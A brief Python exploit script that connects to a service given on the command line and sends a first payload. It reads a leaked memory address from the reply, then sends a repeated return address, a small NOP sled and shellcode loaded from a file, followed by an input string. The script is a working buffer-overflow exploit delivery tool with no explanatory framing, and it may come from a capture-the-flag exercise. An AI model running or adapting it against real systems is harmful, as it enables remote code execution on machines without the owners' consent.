import sys, socket, time

f1 = open("p1", "rb")
p1 = f1.read()
f2 = open("ex", "rb")
p2 = f2.read()

ip = sys.argv[1]
port = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("GOT1",s.recv(512))
s.send(p1)
data = s.recv(512)
print("GOT",data)
addr = int.from_bytes(data[:4], byteorder="little")
print(hex(addr))
addr += 24
ab = addr.to_bytes(4, byteorder="little")
time.sleep(4)
s.send(ab*7 + bytes([0x90]*6) + p2)
time.sleep(1)
s.send(bytes(sys.argv[3] + "\n","ascii"))
print("RX",s.recv(512))
